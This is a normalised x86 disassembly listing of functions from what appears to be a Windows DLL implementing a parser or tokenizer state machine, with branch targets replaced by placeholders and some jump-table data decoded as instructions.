push edi
mov eax esi
call sub_1006d0a0
add esp 0x8
cmp [ ebx + 0x28 ] 0x0
je r-xdata
push edi
mov eax ebx
call sub_1006ded0
add esp 0x4
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_1006cc00
mov eax [ edi + 0xc ]
mov [ eax + 0x38 ] 0x1
sub_10071da0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
push ebx
xor ebx ebx
mov ecx 0xa
cmp [ eax + 0x40 ] ebx
je r-xdata
mov [ eax + 0x40 ] ebx
cmp [ esi ] 0x2
jne r-xdata
cmp [ esi ] 0x4
jne r-xdata
mov eax [ edx + 0xc ]
mov ecx [ eax + 0xc ]
push edi
cmp ecx ebx
je r-xdata
xor eax eax
cmp [ esi + 0x18 ] ecx
sete al
cmp eax ebx
je r-xdata
cmp [ esi + 0x18 ] ecx
jne r-xdata
mov eax [ edx + 0xc ]
mov ecx [ eax ]
push esi
push edx
mov edx [ ecx * 4 + r--data ]
call edx
add esp 0x8
pop edi
pop ebx
pop ebp
retn
mov eax [ eax + 0x8 ]
mov edi [ eax + ecx * 4 - 0x4 ]
cmp edi ebx
je r-xdata
cmp [ esi ] 0x2
jne r-xdata
mov ecx [ edx + 0xc ]
mov [ ecx + 0x6c ] 0x1
mov [ eax + 0x40 ] ebx
mov ecx [ edx + 0xc ]
mov eax [ ecx + 0x68 ]
push eax
push edx
call sub_1001bee0
add esp 0x8
mov eax 0x1
pop ebx
pop ebp
retn
mov ecx [ edi + 0x1c ]
push ecx
call sub_1003b570
push eax
push r--data
call sub_1001f980
mov ebx [ edi + 0x20 ]
add esp 0xc
test ebx ebx
je r-xdata
xor eax eax
cmp [ esi + 0x18 ] ebx
sete al
cmp eax ebx
je r-xdata
mov edx [ ebp + 0x8 ]
push 0x96
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push edi
call sub_1006c860
add esp 0x1c
test eax eax
je r-xdata
mov eax [ edx + 0xc ]
mov [ eax + 0x70 ] 0x1
cmp ebx 0x2
jne r-xdata
cmp ebx 0x2
jne r-xdata
mov eax edi
call sub_1006c900
test eax eax
je r-xdata
cmp [ edi ] 0x1
jne r-xdata
mov eax [ esi ]
cmp eax 0x5
je r-xdata
cmp [ esi ] 0x7
je r-xdata
mov eax [ esi ]
cmp eax 0x1
je r-xdata
cmp [ edi + 0x1c ] 0x5b
jne r-xdata
cmp eax 0x4
je r-xdata
pop edi
pop ebx
mov eax esi
pop ebp
jmp sub_100719c0
cmp eax 0x5
je r-xdata
cmp [ esi ] 0x1
jne r-xdata
cmp eax 0x6
je r-xdata
cmp eax 0x6
je r-xdata
xor eax eax
cmp [ esi + 0x18 ] 0x5c
sete al
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp eax 0x4
je r-xdata
push 0x96
push 0x5a
push 0x59
push eax
mov eax esi
call sub_1006c810
add esp 0x10
test eax eax
je r-xdata
sub_10071f10
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ esi ]
test edi edi
jne r-xdata
cmp edi 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_1006c750
add esp 0x4
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp edi 0x2
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] eax
sete al
test eax eax
je r-xdata
cmp edi 0x4
je r-xdata
xor eax eax
cmp [ esi + 0x18 ] 0x8
sete al
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_1006ed80
add esp 0x8
pop edi
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_1006ea50
add esp 0x8
pop edi
pop esi
pop ebp
retn
cmp edi 0x3
je r-xdata
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_1006cc00
mov edx [ esi + 0xc ]
lea eax [ edi - 0x1 ]
pop edi
mov [ edx ] 0x3
pop esi
pop ebp
retn
push 0x96
push 0x6
push 0x82
push 0x5
push 0x4
push 0x7e
push 0x8b
push 0x1
mov eax esi
call sub_1006c810
add esp 0x20
test eax eax
jne r-xdata
push 0x96
push 0x8
push 0x1
push 0x1
mov eax esi
call sub_1006c810
add esp 0x10
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006c750
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_1001bee0
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp edi 0x2
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006c750
add esp 0x4
mov eax edi
call sub_1006cc00
mov eax [ edi + 0xc ]
mov [ eax ] 0x3
mov ecx [ edi + 0xc ]
pop edi
mov [ ecx + 0x34 ] 0x1
xor eax eax
pop esi
pop ebp
retn
cmp [ esi + 0x18 ] 0x42
sete al
test eax eax
je r-xdata
sub_10072050
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebx + 0xc ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ esi ]
mov [ ebp - 0x4 ] ecx
cmp edi 0x4
jne r-xdata
test edi edi
je r-xdata
mov edi esi
mov eax ebx
call sub_1006d1b0
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push ebx
mov eax esi
call sub_1006c750
mov eax [ ebx + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push ebx
call sub_1001bee0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x3
jne r-xdata
cmp edi 0x1
jne r-xdata
mov eax [ ecx + 0xc ]
test eax eax
jne r-xdata
push 0x96
push 0x2
push 0x6
push 0x7
push 0x82
push 0x5
push 0x4
push 0x7e
push 0x8b
push 0x3
push 0x1
mov eax esi
call sub_1006c810
add esp 0x2c
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
xor ecx ecx
test eax eax
sete cl
test ecx ecx
je r-xdata
mov edx [ ecx + 0x8 ]
mov eax [ edx + eax * 4 - 0x4 ]
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_1006cce0
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov ebx eax
mov eax [ ebp + 0x8 ]
call sub_1006cce0
lea eax [ edi - 0x2 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x1
jne r-xdata
push ebx
mov eax esi
call sub_1006c750
mov edi ebx
call sub_1006caa0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2c ]
lea edi [ eax + 0x8 ]
push edi
push ecx
push ebx
call sub_100520a0
push esi
push ebx
call sub_1006ea50
mov edx [ ebp - 0x4 ]
mov esi eax
mov eax [ edx + 0x2c ]
push edi
push eax
push ebx
call sub_10038c10
add esp 0x24
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ecx ecx
cmp eax 0xa
sete cl
test ecx ecx
je r-xdata
push esi
push ebx
call sub_1006ed80
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x2
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] edi
sete al
test eax eax
jne r-xdata
xor edx edx
cmp eax 0x81
sete dl
mov eax edx
test eax eax
je r-xdata
mov edi esi
call sub_1006d010
mov eax [ ebp - 0x4 ]
mov [ eax + 0x3c ] 0x0
mov ecx [ ebx + 0xc ]
pop edi
pop esi
mov [ ecx ] 0x6
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push 0xa
mov eax 0x8
mov ecx ebx
call sub_1006d050
mov ecx [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
add esp 0x4
pop edi
mov eax 0x1
pop esi
mov [ ecx ] 0x6
mov [ edx + 0x34 ] eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x42
push 0x0
push 0xa
push 0x0
mov eax esi
call sub_1006c810
add esp 0x14
test eax eax
je r-xdata
mov edi esi
call sub_1006d010
mov eax [ ebx + 0xc ]
pop edi
pop esi
mov [ eax ] 0x13
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
sub_10072240
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0x8 ]
cmp [ esi + 0x4 ] eax
jb r-xdata
mov esp ebp
pop ebp
retn
test eax eax
je r-xdata
push 0x8
push ebx
mov [ esi + 0x8 ] 0x2
call sub_10024af0
add esp 0x8
mov [ esi ] eax
lea ecx [ eax * 4 ]
add eax eax
mov [ esi + 0x8 ] eax
add eax eax
push edi
add eax eax
push eax
push ebx
mov [ ebp - 0x4 ] ecx
call sub_10024af0
mov edx [ ebp - 0x4 ]
mov edi eax
mov eax [ esi ]
push edx
push eax
push edi
call sub_10078600
mov ecx [ esi ]
push ecx
push ebx
call sub_10030ff0
add esp 0x1c
mov [ esi ] edi
pop edi
mov esp ebp
pop ebp
retn
sub_100722b0
push ebp
mov ebp esp
push esi
push edi
mov edi eax
push edi
call sub_10043670
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
mov ebx [ edi + 0x8 ]
lea eax [ esi + 0x4 ]
push eax
lea edi [ ebx + 0x94 ]
push edi
call sub_10061790
push edi
call sub_10015610
mov ecx [ ebp + 0x8 ]
push edi
mov [ esi + 0x10 ] eax
mov [ esi ] ecx
call sub_100081a0
mov [ esi + 0x18 ] eax
mov ebx [ ebx ]
add esp 0x10
cmp ebx 0x43
ja r-xdata
pop ebx
movzx edx [ ebx + lookup_table_100723e4 ]
jmp [ edx * 4 + jump_table_100723b0 ]
pop ebx
pop edi
mov [ esi + 0x1c ] 0x0
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x1
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x2
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x3
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x4
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x5
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x6
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x7
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x8
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0x9
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0xb
pop esi
pop ebp
retn
pop ebx
pop edi
mov [ esi + 0x1c ] 0xc
pop esi
pop ebp
retn
mov [ esi + 0x1c ] 0xd
sub_100723f1
add eax [ ebx ]
add eax [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x6
pop es
pop es
pop es
or [ eax ] cl
or [ ecx ] al
or [ ecx ] cl
or cl [ ebx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or ecx [ ebx ]
or al 0xcc
int3
sub_10072430
push ebx
push edi
mov edi [ esi + 0x8 ]
lea eax [ edi + 0x94 ]
push eax
call sub_1003fdd0
lea ebx [ edi + 0x10 ]
push ebx
push esi
call sub_1001bc80
push ebx
push esi
call sub_1001c570
add edi 0x20
push edi
push esi
call sub_1001bc80
push edi
push esi
call sub_1001c570
add esp 0x24
pop edi
pop ebx
retn
sub_10072470
push esi
mov esi [ eax + 0x8 ]
push edi
lea ecx [ esi + 0x50 ]
push ecx
lea edi [ esi + 0x94 ]
push edi
call sub_10061790
push edi
call sub_10015610
add esp 0xc
pop edi
mov [ esi + 0x48 ] eax
pop esi
retn
sub_100724a0
push ebp
mov ebp esp
mov eax [ esi + 0x8 ]
push ebx
push edi
add eax 0x10
push eax
push esi
call sub_100690f0
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov edi [ esi + 0x8 ]
lea edx [ edi + 0x94 ]
push edx
call sub_1003fdd0
lea ebx [ edi + 0x10 ]
push ebx
push esi
call sub_1001bc80
push ebx
push esi
call sub_1001c570
add edi 0x20
push edi
push esi
call sub_1001bc80
push edi
push esi
call sub_1001c570
add esp 0x2c
pop edi
pop ebx
pop ebp
retn
sub_100724f0
push esi
mov esi [ eax + 0x8 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov edx [ esi + 0x30 ]
push ebx
lea ebx [ esi + 0x30 ]
mov [ edi + 0x4 ] edx
mov eax [ ebx + 0x4 ]
mov [ edi + 0x8 ] eax
mov ecx [ ebx + 0x8 ]
mov [ edi + 0xc ] ecx
mov edx [ esi + 0x2c ]
lea eax [ esi + 0x94 ]
push eax
mov [ edi + 0x10 ] edx
call sub_10015610
mov [ esi + 0x2c ] eax
lea eax [ esi + 0x94 ]
push ebx
push eax
call sub_10061790
mov esi [ esi + 0x2c ]
mov eax [ edi + 0x10 ]
add esp 0xc
sub esi eax
mov [ edi + 0x14 ] esi
pop ebx
je r-xdata
lea ecx [ esi + 0x94 ]
push ecx
call sub_1002afa0
add esp 0x4
pop esi
retn
cmp [ esi + eax - 0x1 ] 0xd
jne r-xdata
dec esi
mov [ edi + 0x14 ] esi
sub_10072560
push ebx
push edi
mov edi [ esi + 0x8 ]
mov eax [ edi + 0x80 ]
push eax
push esi
call sub_10030ff0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push esi
call sub_100690f0
mov [ edi + 0x80 ] eax
mov ebx [ esi + 0x8 ]
lea ecx [ ebx + 0x94 ]
push ecx
call sub_1003fdd0
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_1001bc80
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_1001c570
add ebx 0x20
push ebx
push esi
call sub_1001bc80
push ebx
push esi
call sub_1001c570
add esp 0x34
mov [ edi + 0x8c ] 0x1
pop edi
pop ebx
retn
sub_100725d0
push ebx
push edi
mov edi [ esi + 0x8 ]
mov eax [ edi + 0x84 ]
push eax
push esi
call sub_10030ff0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push esi
call sub_100690f0
mov [ edi + 0x84 ] eax
mov ebx [ esi + 0x8 ]
lea ecx [ ebx + 0x94 ]
push ecx
call sub_1003fdd0
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_1001bc80
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_1001c570
add ebx 0x20
push ebx
push esi
call sub_1001bc80
push ebx
push esi
call sub_1001c570
add esp 0x34
mov [ edi + 0x90 ] 0x1
pop edi
pop ebx
retn
sub_10072640
push ebp
mov ebp esp
push edi
mov edi eax
lea eax [ esi + 0x1 ]
cmp eax 0x21
ja r-xdata
mov eax 0x5
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov [ edi + 0x18 ] esi
call sub_100724f0
pop edi
pop ebp
retn
movzx eax [ eax + lookup_table_100726d0 ]
jmp [ eax * 4 + jump_table_100726c0 ]
mov eax 0x4
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov [ edi + 0x18 ] esi
call sub_100724f0
pop edi
pop ebp
retn
push r--data
call sub_1001f980
mov eax 0x6
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
add esp 0x4
mov [ edi + 0x18 ] esi
call sub_100724f0
pop edi
pop ebp
retn
mov eax 0x7
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov [ edi + 0x18 ] esi
call sub_100724f0
pop edi
pop ebp
retn
sub_100726d4
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ edx ]
add eax [ edx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_10072700
push ebx
push edi
mov edi eax
xor ebx ebx
mov [ edi ] ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x7c ]
mov [ edi + 0x18 ] ecx
mov edx [ eax + 0x80 ]
mov [ edi + 0x1c ] edx
mov ecx [ eax + 0x84 ]
mov [ edi + 0x20 ] ecx
mov edx [ eax + 0x88 ]
mov [ edi + 0x24 ] edx
mov ecx [ eax + 0x8c ]
mov [ edi + 0x28 ] ecx
mov edx [ eax + 0x90 ]
mov eax esi
mov [ edi + 0x2c ] edx
call sub_100724f0
mov eax [ esi + 0x8 ]
pop edi
mov [ eax + 0x7c ] ebx
mov [ eax + 0x80 ] ebx
mov [ eax + 0x84 ] ebx
mov [ eax + 0x88 ] ebx
mov [ eax + 0x8c ] ebx
mov [ eax + 0x90 ] ebx
pop ebx
retn
sub_10072770
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebx + 0x8 ]
add esi 0x3c
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov [ edi ] 0x2
mov edx [ esi + 0x10 ]
xor ebx ebx
mov [ edi + 0x18 ] edx
cmp [ esi + 0x24 ] ebx
jbe r-xdata
mov [ edi ] 0x1
mov eax [ esi + 0x10 ]
mov [ edi + 0x18 ] eax
mov ecx [ esi + 0x20 ]
mov [ edi + 0x1c ] ecx
mov edx [ esi + 0x24 ]
mov [ edi + 0x20 ] edx
mov eax [ esi + 0x28 ]
mov [ edi + 0x24 ] eax
mov ecx [ esi + 0x3c ]
mov [ edi + 0x28 ] ecx
mov eax [ esi + 0x10 ]
push eax
mov [ esi + 0x34 ] eax
call sub_1003b570
push eax
push r--data
call sub_1001f980
add esp 0xc
jmp r-xdata
mov eax [ esi + 0x20 ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_10030ff0
mov edx [ esi + 0x10 ]
push edx
call sub_1003b570
push eax
push r--data
call sub_1001f980
mov ebx [ ebp + 0x8 ]
add esp 0x14
mov eax [ esi + 0x20 ]
mov ecx [ eax + ebx * 4 ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
call sub_10044fc0
inc ebx
add esp 0x8
cmp ebx [ esi + 0x24 ]
jb r-xdata
push esi
push ebx
call sub_1001bc80
mov esi [ ebx + 0x8 ]
add esp 0x8
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ esi + 0x30 ]
lea ebx [ esi + 0x30 ]
mov [ edi + 0x4 ] ecx
mov edx [ ebx + 0x4 ]
mov [ edi + 0x8 ] edx
mov eax [ ebx + 0x8 ]
mov [ edi + 0xc ] eax
mov ecx [ esi + 0x2c ]
lea eax [ esi + 0x94 ]
push eax
mov [ edi + 0x10 ] ecx
call sub_10015610
mov [ esi + 0x2c ] eax
lea eax [ esi + 0x94 ]
push ebx
push eax
call sub_10061790
mov esi [ esi + 0x2c ]
mov eax [ edi + 0x10 ]
add esp 0xc
sub esi eax
mov [ edi + 0x14 ] esi
je r-xdata
lea eax [ esi + 0x94 ]
push eax
call sub_1002afa0
add esp 0x4
mov edx [ edi + 0x14 ]
push eax
push edx
push r--data
call sub_1001f980
add esp 0xc
pop esi
mov eax 0x1
pop ebx
pop ebp
retn
cmp [ esi + eax - 0x1 ] 0xd
jne r-xdata
dec esi
mov [ edi + 0x14 ] esi
sub_100728b0
push esi
mov esi [ ebx + 0x8 ]
push edi
add esi 0x3c
xor edi edi
cmp [ esi + 0x24 ] edi
jbe r-xdata
mov edx [ esi + 0x20 ]
push edx
push ebx
call sub_10030ff0
push esi
push ebx
call sub_1001bc80
push r--data
call sub_1001f980
add esp 0x14
pop edi
pop esi
retn
nop
mov eax [ esi + 0x20 ]
mov ecx [ eax + edi * 4 ]
push ecx
push ebx
call sub_10044fc0
inc edi
add esp 0x8
cmp edi [ esi + 0x24 ]
jb r-xdata
sub_10072900
push ebp
mov ebp esp
sub esp 0xc
push esi
push edi
mov esi eax
mov edi [ esi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push 0x0
push ecx
lea edx [ edi + 0x94 ]
push edx
push esi
call sub_1000a500
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
add esp 0x14
cmp eax [ r--data ]
je r-xdata
mov edi ebx
mov eax esi
mov [ ebx ] 0x5
mov [ ebx + 0x18 ] 0x26
call sub_100724f0
xor eax eax
cmp [ ebp - 0x4 ] eax
pop edi
setne al
pop esi
mov esp ebp
pop ebp
retn
mov [ edi + 0x4 ] 0x1
push esi
mov esi [ ebp - 0xc ]
mov eax ebx
call sub_10072640
mov ecx [ ebp - 0x8 ]
add esp 0x4
xor eax eax
cmp [ ebp - 0x4 ] eax
mov [ edi + 0xc ] ecx
pop edi
setne al
pop esi
mov esp ebp
pop ebp
retn
sub_10072980
push ebx
push edi
mov edi eax
mov [ edi ] 0x3
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push esi
call sub_100690f0
mov [ edi + 0x18 ] eax
mov ebx [ esi + 0x8 ]
lea eax [ ebx + 0x94 ]
push eax
call sub_1003fdd0
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_1001bc80
lea eax [ ebx + 0x10 ]
push eax
push esi
call sub_1001c570
add ebx 0x20
push ebx
push esi
call sub_1001bc80
push ebx
push esi
call sub_1001c570
add esp 0x2c
mov eax esi
call sub_100724f0
pop edi
mov eax 0x1
pop ebx
retn
sub_100729e0
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebx + 0x8 ]
lea eax [ esi + 0x94 ]
push edi
push eax
call sub_1000e3b0
mov ecx [ esi + 0x10 ]
mov [ esi + 0x1c ] ecx
mov edi [ ebx + 0x8 ]
mov eax [ edi + 0x1c ]
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
mov [ edi + 0x1c ] ecx
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov edx [ edi + 0x14 ]
add edx [ edi + 0x10 ]
cmp eax edx
jae r-xdata
mov edx [ edi + 0x4 ]
mov [ edi + 0x4 ] ecx
movsx esi [ eax ]
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x4 ] edx
call sub_10072640
mov ecx [ ebp - 0x4 ]
add esp 0x4
mov eax 0x1
add [ edi + 0x1c ] eax
mov [ edi + 0x4 ] ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10072a50
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0x8 ]
push ebx
push edi
lea edi [ eax + 0x3c ]
add eax 0x94
push eax
call sub_100081a0
lea ecx [ eax - 0x41 ]
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp ecx 0x19
ja r-xdata
mov edx [ esi + 0x8 ]
add edx 0x3c
push edx
push esi
call sub_1001c570
mov ebx [ esi + 0x8 ]
lea ecx [ ebx + 0x50 ]
lea eax [ ebx + 0x94 ]
push ecx
push eax
call sub_10061790
lea eax [ ebx + 0x94 ]
push eax
call sub_10015610
mov edx [ ebp - 0x4 ]
push edi
push edx
push esi
mov [ ebx + 0x48 ] eax
call sub_10062120
lea eax [ edi + 0x20 ]
push eax
push 0x4
push esi
call sub_10004e00
mov ecx [ ebp + 0x8 ]
xor eax eax
push r--data
mov [ edi + 0x2c ] eax
mov [ edi + 0x38 ] ecx
mov [ edi + 0x3c ] eax
call sub_1001f980
add esp 0x30
pop edi
pop ebx
mov esp ebp
pop ebp
retn
add eax 0x20
mov [ ebp - 0x4 ] eax
sub_10072af0
push ebx
push edi
mov edi [ esi + 0x8 ]
add edi 0x3c
push edi
push esi
call sub_100690f0
mov ebx eax
push ebx
call sub_10001080
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x3c ]
push ecx
push esi
call sub_10030ff0
mov edx [ esi + 0x8 ]
add edx 0x3c
push edx
push esi
call sub_1001c570
mov edi [ esi + 0x8 ]
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10061790
lea eax [ edi + 0x94 ]
push eax
call sub_10015610
push ebx
push esi
mov [ edi + 0x48 ] eax
call sub_10030ff0
add esp 0x30
pop edi
pop ebx
retn
sub_10072b60
push ebp
mov ebp esp
push esi
mov esi eax
push edi
push esi
call sub_10043670
mov edi eax
add esp 0x4
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x8 ]
mov [ edi ] 0x18
mov ecx [ eax + 0x50 ]
mov [ edi + 0x4 ] ecx
mov edx [ eax + 0x54 ]
mov [ edi + 0x8 ] edx
mov ecx [ eax + 0x58 ]
mov [ edi + 0xc ] ecx
mov edx [ eax + 0x48 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ edi + 0x1c ] eax
mov [ edi + 0x10 ] edx
mov [ edi + 0x20 ] ecx
mov eax [ esi + 0x8 ]
add eax 0x3c
push eax
push esi
call sub_100690f0
mov [ edi + 0x18 ] eax
mov edx [ esi + 0x8 ]
mov eax [ edx + 0x3c ]
push eax
push esi
call sub_10030ff0
mov ecx [ esi + 0x8 ]
add ecx 0x3c
push ecx
push esi
call sub_1001c570
mov esi [ esi + 0x8 ]
lea edx [ esi + 0x50 ]
push edx
lea edi [ esi + 0x94 ]
push edi
call sub_10061790
push edi
call sub_10015610
add esp 0x24
mov [ esi + 0x48 ] eax
sub_10072bf0
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
xor edx edx
lea eax [ ebx + 0x5c ]
mov [ ebx + 0x68 ] edx
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] ecx
cmp ecx edx
jbe r-xdata
push 0x4c
push edi
call sub_10024af0
mov esi eax
mov [ esi ] 0x0
mov eax [ edi + 0x8 ]
add eax 0x3c
push eax
push edi
call sub_100690f0
mov [ esi + 0x4 ] eax
mov ebx [ edi + 0x8 ]
mov eax [ ebx + 0x48 ]
mov [ esi + 0x8 ] eax
lea eax [ ebx + 0x94 ]
push eax
mov [ ebp - 0xc ] eax
call sub_10015610
sub eax [ ebx + 0x48 ]
mov ecx [ esi + 0x8 ]
add esp 0x14
mov [ esi + 0xc ] eax
cmp [ ecx + eax - 0x1 ] 0xd
jne r-xdata
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
nop
mov edx [ ebx + 0x50 ]
mov [ esi + 0x1c ] edx
mov eax [ ebx + 0x54 ]
mov edx [ ebp - 0xc ]
mov [ esi + 0x20 ] eax
mov ecx [ ebx + 0x58 ]
lea eax [ esi + 0x28 ]
push eax
push edx
mov [ esi + 0x24 ] ecx
call sub_10061790
push r--data
push edi
call sub_1002bb60
mov [ esi + 0x10 ] eax
mov ebx [ edi + 0x8 ]
mov eax [ ebx + 0x48 ]
mov [ esi + 0x14 ] eax
lea eax [ ebx + 0x94 ]
push eax
mov [ ebp - 0xc ] eax
call sub_10015610
sub eax [ ebx + 0x48 ]
mov ecx [ esi + 0x14 ]
add esp 0x14
mov [ esi + 0x18 ] eax
cmp [ ecx + eax - 0x1 ] 0xd
jne r-xdata
dec eax
mov [ esi + 0xc ] eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebx + 0x40 ]
sub eax edx
cmp eax ecx
jne r-xdata
mov edx [ ebx + 0x50 ]
mov [ esi + 0x1c ] edx
mov eax [ ebx + 0x54 ]
mov edx [ ebp - 0xc ]
mov [ esi + 0x20 ] eax
mov ecx [ ebx + 0x58 ]
lea eax [ esi + 0x28 ]
push eax
push edx
mov [ esi + 0x24 ] ecx
call sub_10061790
mov eax [ ebp - 0x10 ]
push eax
push esi
push edi
call sub_100520a0
mov ecx [ edi + 0x8 ]
mov edx [ ecx + 0x3c ]
push edx
push edi
call sub_10030ff0
mov eax [ edi + 0x8 ]
add eax 0x3c
push eax
push edi
call sub_1001c570
mov edi [ edi + 0x8 ]
lea ecx [ edi + 0x50 ]
push ecx
lea esi [ edi + 0x94 ]
push esi
call sub_10061790
push esi
call sub_10015610
add esp 0x30
mov [ edi + 0x48 ] eax
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
dec eax
mov [ esi + 0x18 ] eax
mov eax [ ebp - 0x8 ]
add [ ebp - 0x4 ] 0x4
inc eax
mov [ ebp - 0x8 ] eax
cmp eax [ ebp - 0xc ]
jb r-xdata
mov eax ecx
mov ecx [ ebx + 0x3c ]
cmp eax 0x4
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
mov esi [ eax + 0x4 ]
mov eax esi
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
test eax eax
je r-xdata
lea ebx [ ebx ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
push ecx
push edx
mov eax edi
call sub_10072b60
add esp 0x8
pop edi
pop esi
mov [ ebx + 0x68 ] 0x1
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov dl [ ecx ]
cmp dl [ esi ]
jne r-xdata
sub eax 0x4
add ecx 0x4
add esi 0x4
cmp eax 0x4
jae r-xdata
cmp eax 0x1
jbe r-xdata
mov edx [ esi ]
cmp edx [ ecx ]
jne r-xdata
mov dl [ ecx + 0x1 ]
cmp dl [ esi + 0x1 ]
jne r-xdata
cmp eax 0x2
jbe r-xdata
mov al [ ecx + 0x2 ]
cmp al [ esi + 0x2 ]
je r-xdata
sub_10072df0
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
mov eax [ esi + 0x8 ]
cmp [ eax + 0x68 ] 0x0
push edi
je r-xdata
mov ecx [ eax + 0x60 ]
